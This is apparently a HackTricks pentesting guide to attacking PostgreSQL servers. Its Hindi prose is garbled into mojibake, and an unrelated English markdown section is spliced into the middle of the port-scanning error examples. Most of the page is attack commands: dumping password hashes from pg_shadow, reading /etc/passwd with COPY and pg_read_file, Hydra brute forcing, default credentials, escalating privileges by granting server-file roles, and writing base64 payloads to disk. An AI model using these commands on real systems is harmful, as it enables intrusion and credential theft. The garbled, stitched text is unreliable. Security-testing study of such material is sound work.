# 5432,5433 - рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдкреЛрд╕реНрдЯрдЧреНрд░реЗрд╕рдХреНрдпреВрдПрд▓

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ **рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ** рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣реЛрдВ** рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдирд┐рд░реНрдорд┐рдд рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде</strong>!</summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА**

**PostgreSQL** рдХреЛ рдПрдХ **рдСрдмреНрдЬреЗрдХреНрдЯ-рд╕рдВрдмрдВрдзреА рдбреЗрдЯрд╛рдмреЗрд╕ рд╕рд┐рд╕реНрдЯрдо** рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд░реНрдгрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ **рдУрдкрди рд╕реЛрд░реНрд╕** рд╣реИред рдпрд╣ рд╕рд┐рд╕реНрдЯрдо рдХреЗрд╡рд▓ SQL рднрд╛рд╖рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдмрд▓реНрдХрд┐ рдЗрд╕реЗ рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдмрдврд╝рд╛рддрд╛ рд╣реИред рдЗрд╕рдХреА рдХреНрд╖рдорддрд╛рдПрдБ рдЗрд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ рдбреЗрдЯрд╛ рдкреНрд░рдХрд╛рд░реЛрдВ рдФрд░ рдХрд╛рд░реНрд░рд╡рд╛рдЗрдпреЛрдВ рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдпрд╣ рдбреЗрд╡рд▓рдкрд░реНрд╕ рдФрд░ рд╕рдВрдЧрдардиреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрд╣реБрдореБрдЦреА рд╡рд┐рдХрд▓реНрдк рдмрдирддрд╛ рд╣реИред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** 5432, рдФрд░ рдпрджрд┐ рдпрд╣ рдкреЛрд░реНрдЯ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЗрд╕реНрддреЗрдорд╛рд▓ рдореЗрдВ рд╣реИ рддреЛ рдкреНрд░рддреАрдд рд╣реЛрддрд╛ рд╣реИ рдХрд┐ postgresql рдЕрдЧрд▓рд╛ рдкреЛрд░реНрдЯ (5433 рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ) рдЙрдкрдпреЛрдЧ рдореЗрдВ рд▓рд╛рдПрдЧрд╛ рдЬреЛ рдЙрдкрдпреЛрдЧ рдореЗрдВ рдирд╣реАрдВ рд╣реИред
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## рдХрдиреЗрдХреНрдЯ рдФрд░ рдореВрд▓ рдЬрд╛рдВрдЪ
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
рдпрджрд┐ рдЖрдк **`\list`** рдЪрд▓рд╛рддреЗ рд╣реИрдВ рдФрд░ рдЖрдкрдХреЛ рдПрдХ рдбреЗрдЯрд╛рдмреЗрд╕ рдорд┐рд▓рддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо **`rdsadmin`** рд╣реИ, рддреЛ рдЖрдк рдЬрд╛рди рд▓реЗрддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк **AWS postgresql рдбреЗрдЯрд╛рдмреЗрд╕** рдХреЗ рдЕрдВрджрд░ рд╣реИрдВред
{% endhint %}

**рдкреЛрд╕реНрдЯрдЧреНрд░реЗрд╕рдХреНрдпреВрдПрд▓ рдбреЗрдЯрд╛рдмреЗрд╕** рдХреЛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЧрдгрдирд╛
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **рдкреЛрд░реНрдЯ рд╕реНрдХреИрдирд┐рдВрдЧ**

[**рдЗрд╕ рд░рд┐рд╕рд░реНрдЪ**](https://www.exploit-db.com/papers/13084) рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдЬрдм рдХреЛрдИ рдХрдиреЗрдХреНрд╢рди рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдЕрд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, `dblink` рдПрдХ `sqlclient_unable_to_establish_sqlconnection` рдЕрдкрд╡рд╛рдж рдлреЗрдВрдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рддреНрд░реБрдЯрд┐ рдХрд╛ рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИред рдЗрди рд╡рд┐рд╡рд░рдгреЛрдВ рдХреА рдХреБрдЫ рдЙрджрд╛рд╣рд░рдг рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рд╣реИрдВред
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* **рд╣реЛрд╕реНрдЯ рдиреАрдЪреЗ рд╣реИ**

`рд╡рд┐рд╕реНрддрд╛рд░: рд╕рд░реНрд╡рд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрд╛: рд╣реЛрд╕реНрдЯ рдХреЛ рд░реВрдЯ рддрдХ рдХреЛрдИ рдорд╛рд░реНрдЧ рдирд╣реАрдВ рд╣реИ рдХреНрдпрд╛ рд╕рд░реНрд╡рд░ "1.2.3.4" рдкрд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рдФрд░ рдкреЛрд░реНрдЯ 5678 рдкрд░ TCP/IP рдХрдиреЗрдХреНрд╢рди рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд░рд╣рд╛ рд╣реИ?`

* **рдкреЛрд░реНрдЯ рдмрдВрдж рд╣реИ**
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рд╣реИ
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
```md
## PostgreSQL

### Enumeration

To discover PostgreSQL services running on the target system, you can use tools like Nmap:

```bash
nmap -sV -p 5432 <target_ip>
```

### Default Credentials

PostgreSQL has default credentials that are commonly used. Make sure to test these credentials during your assessment:

- Username: `postgres`, Password: `postgres`
- Username: `postgres`, Password: `admin`
- Username: `postgres`, Password: `password`

### Brute Forcing

You can use tools like Metasploit or Hydra to perform brute force attacks against PostgreSQL services. Here is an example using Hydra:

```bash
hydra -L users.txt -P passwords.txt postgres://<target_ip>:5432
```

### Exploitation

Exploiting PostgreSQL involves leveraging vulnerabilities like SQL injection or weak authentication mechanisms. Be sure to conduct thorough testing to identify and exploit any weaknesses in the PostgreSQL service.

### Post-Exploitation

After gaining access to the PostgreSQL service, you can perform various post-exploitation activities such as:

- Dumping data from databases
- Modifying database records
- Creating new database users
- Executing system commands through SQL queries
```
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рд╣реИ рдпрд╛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
## рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреА рдЧрдгрдирд╛

### рднреВрдорд┐рдХрд╛рдПрдБ

| рднреВрдорд┐рдХрд╛ рдкреНрд░рдХрд╛рд░  |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╕реБрдкрд░рдпреВрдЬрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реИрдВ                                                                                                                        |
| rolinherit     | рднреВрдорд┐рдХрд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЙрди рднреВрдорд┐рдХрд╛рдУрдВ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЕрдзрд┐рдХреГрдд рдХрд░рддреА рд╣реИ рдЬрд┐рдирдХреЗ рд╕рджрд╕реНрдп рд╣реИрдВ                                                                                    |
| rolcreaterole  | рднреВрдорд┐рдХрд╛ рдЕрдзрд┐рдХ рднреВрдорд┐рдХрд╛рдПрдБ рдмрдирд╛ рд╕рдХрддреА рд╣реИрдВ                                                                                                                           |
| rolcreatedb    | рднреВрдорд┐рдХрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдмрдирд╛ рд╕рдХрддреА рд╣реИрдВ                                                                                                                            |
| rolcanlogin    | рднреВрдорд┐рдХрд╛ рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддреА рд╣реИред рдЕрд░реНрдерд╛рдд, рдЗрд╕ рднреВрдорд┐рдХрд╛ рдХреЛ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд╕рддреНрд░ рдЕрдзрд┐рдХреГрдд рдХреЗ рд░реВрдк рдореЗрдВ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ                                                     |
| rolreplication | рднреВрдорд┐рдХрд╛ рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рднреВрдорд┐рдХрд╛ рд╣реИред рдПрдХ рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рднреВрдорд┐рдХрд╛ рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдХрдиреЗрдХреНрд╢рди рдЖрд░рдВрдн рдХрд░ рд╕рдХрддреА рд╣реИ рдФрд░ рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рд╕реНрд▓реЙрдЯ рдмрдирд╛ рдФрд░ рд╣рдЯрд╛ рд╕рдХрддреА рд╣реИред                           |
| rolconnlimit   | рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рд╡рд╛рд▓реА рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд▓рд┐рдП, рдпрд╣ рдЗрд╕ рднреВрдорд┐рдХрд╛ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рд╕рдордХрд╛рд▓рд┐рдХ рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреА рдЕрдзрд┐рдХрддрдо рд╕рдВрдЦреНрдпрд╛ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИред -1 рдХрд╛ рдЕрд░реНрде рд╣реИ рдХреЛрдИ рд╕реАрдорд╛ рдирд╣реАрдВред                                 |
| rolpassword    | рдкрд╛рд╕рд╡рд░реНрдб рдирд╣реАрдВ (рд╣рдореЗрд╢рд╛ `********` рдХреЗ рд░реВрдк рдореЗрдВ рдкрдврд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ)                                                                                                        |
| rolvaliduntil  | рдкрд╛рд╕рд╡рд░реНрдб рд╕рдорд╛рдкреНрддрд┐ рд╕рдордп (рдХреЗрд╡рд▓ рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ); рд╕рдорд╛рдкреНрддрд┐ рдирд╣реАрдВ рд╣реИ рддреЛ null                                                                  |
| rolbypassrls   | рднреВрдорд┐рдХрд╛ рдкреНрд░рддреНрдпреЗрдХ рдкрдВрдХреНрддрд┐-рд╕реНрддрд░ рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рддреА рд╣реИ, рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [рдЕрдиреБрднрд╛рдЧ 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) рджреЗрдЦреЗрдВред |
| rolconfig      | рд░рди-рдЯрд╛рдЗрдо рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдЪрд░ рдЪрд░рд┐рддреНрд░реЛрдВ рдХреЗ рд▓рд┐рдП рднреВрдорд┐рдХрд╛-рд╡рд┐рд╢реЗрд╖ рдбрд┐рдлрд╝реЙрд▓реНрдЯреНрд╕                                                                                          |
| oid            | рднреВрдорд┐рдХрд╛ рдХреА рдЖрдИрдбреА                                                                                                                                           |

#### рджрд┐рд▓рдЪрд╕реНрдк рд╕рдореВрд╣

* рдпрджрд┐ рдЖрдк **`pg_execute_server_program`** рдХреЗ рд╕рджрд╕реНрдп рд╣реИрдВ рддреЛ рдЖрдк **рдХрд╛рд░реНрдп** рдХреЛ **рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
* рдпрджрд┐ рдЖрдк **`pg_read_server_files`** рдХреЗ рд╕рджрд╕реНрдп рд╣реИрдВ рддреЛ рдЖрдк **рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝** рд╕рдХрддреЗ рд╣реИрдВ
* рдпрджрд┐ рдЖрдк **`pg_write_server_files`** рдХреЗ рд╕рджрд╕реНрдп рд╣реИрдВ рддреЛ рдЖрдк **рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦ** рд╕рдХрддреЗ рд╣реИрдВ

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ Postgres рдореЗрдВ рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛**, рдПрдХ **рд╕рдореВрд╣** рдФрд░ рдПрдХ **рднреВрдорд┐рдХрд╛** **рдПрдХ рд╣реА** рд╣реИред рдпрд╣ **рдЖрдк рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ** рдФрд░ рдпрджрд┐ рдЖрдк **рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ** рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### рддрд╛рд▓рд┐рдХрд╛рдПрдБ
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### рдХрд╛рд░реНрдп
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## рдлрд╝рд╛рдЗрд▓-рд╕рд┐рд╕реНрдЯрдо рдХреНрд░рд┐рдпрд╛рдПрдБ

### рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдЧрдП рдЧреНрд░реБрдк **`DEFAULT_ROLE_READ_SERVER_FILES`** (рдЬрд┐рд╕реЗ **`pg_read_server_files`** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ) рдХреЗ рд╕рджрд╕реНрдп рдФрд░ **рд╕реБрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХрд┐рд╕реА рднреА рдкрде рдкрд░ **`COPY`** рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЬрд╛рдВрдЪреЗрдВ `genfile.c` рдореЗрдВ `convert_and_check_filename`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рд╕реБрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╣реАрдВ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ **CREATEROLE** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ рддреЛ рдЖрдк **рдЙрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп рдмрди рд╕рдХрддреЗ рд╣реИрдВ:**
```sql
GRANT pg_read_server_files TO username;
```
[**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реАред**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

рдХреБрдЫ **рдЕрдиреНрдп рдкреЛрд╕реНрдЯрдЧреНрд░реЗрд╕ рдлрдВрдХреНрд╢рди** рд╣реИрдВ рдЬреЛ **рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдпрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдХреЗрд╡рд▓ **рд╕реБрдкрд░рдпреВрдЬрд░реНрд╕** рдФрд░ **рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдЗрдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
рдЖрдк [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html) рдореЗрдВ **рдЕрдзрд┐рдХ рдХрд╛рд░реНрдп** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

### рд╕рд░рд▓ рдлрд╝рд╛рдЗрд▓ рд▓реЗрдЦрди

рдХреЗрд╡рд▓ **рд╕реБрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдПрдВ** рдФрд░ **`pg_write_server_files`** рдХреЗ рд╕рджрд╕реНрдп рдлрд╝рд╛рдЗрд▓ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдкреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рд╕реБрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╣реАрдВ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ **`CREATEROLE`** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ рддреЛ рдЖрдк **рдЙрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп рдмрди рд╕рдХрддреЗ рд╣ред**
```sql
GRANT pg_write_server_files TO username;
```
[**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реАред**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ COPY рдиреНрдпреВрд▓рд╛рдЗрди рдЪрд╛рд░реНрд╕ рдХреЛ рд╕рдВрднрд╛рд▓ рдирд╣реАрдВ рд╕рдХрддрд╛, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рдПрдХ рдмреЗрд╕64 рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ **рдЖрдкрдХреЛ рдПрдХ-рд▓рд╛рдЗрдирд░ рднреЗрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**ред\
рдЗрд╕ рддрдХрдиреАрдХ рдХреА рдПрдХ рдмрд╣реБрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реАрдорд╛ рдпрд╣ рд╣реИ рдХрд┐ **`copy` рдХрд╛ рдЙрдкрдпреЛрдЧ рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдХреБрдЫ рдмрд╛рдЗрдирд░реА рдорд╛рдиреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИред**

### **рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб**

рд╣рд╛рд▓рд╛рдВрдХрд┐, **рдмрдбрд╝реА рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рддрдХрдиреАрдХреЗрдВ рд╣реИрдВ:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

